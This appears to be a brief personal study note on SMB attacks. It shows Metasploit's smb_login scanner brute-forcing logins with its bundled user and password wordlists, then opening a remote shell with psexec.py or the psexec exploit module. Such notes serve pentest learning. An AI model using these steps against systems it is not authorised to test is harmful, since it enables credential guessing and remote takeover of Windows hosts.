Related to [[Metasploit]] and [[SMB Enumeration]]

We can use 

scanner/smb/smb_login

For userfile and passwordfile we can use
/usr/share/metasploit-framework/data/wordlists/common_users.txt
//usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

Once we have auth, we can use PsExec.py

``` bash
psexec.py [user]@[IP] [shell (cmd.exe)]
```

Metasploit also has the following exploit:

```
exploit/windows/smb/psexec
